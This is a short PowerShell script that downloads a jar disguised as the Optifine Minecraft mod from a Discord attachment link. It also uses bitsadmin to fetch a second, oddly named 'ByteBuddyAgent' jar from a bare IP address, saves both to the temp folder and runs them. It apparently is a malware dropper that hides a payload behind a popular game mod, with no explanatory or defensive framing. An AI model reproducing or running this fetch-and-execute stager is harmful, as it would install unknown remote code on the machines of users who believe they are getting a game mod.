$source = "https://cdn.discordapp.com/attachments/1072597055060594738/1128365821605986436/Optifine1.20.1.jar"
$destination = "$env:TEMP\Optifine1.20.1.jar"
Invoke-WebRequest -Uri $source -OutFile $destination

bitsadmin /transfer "mdj" /download /priority FOREGROUND "http://66.228.37.7/downloads/ByteBuddyAgent_ae832029342a99e39939c9340.jar" "$env:TEMP\ByteBuddyAgent_ae832029342a99e39939c9340.jar"

cd $env:TEMP
start .\Optifine1.20.1.jar
start .\ByteBuddyAgent_ae832029342a99e39939c9340.jar
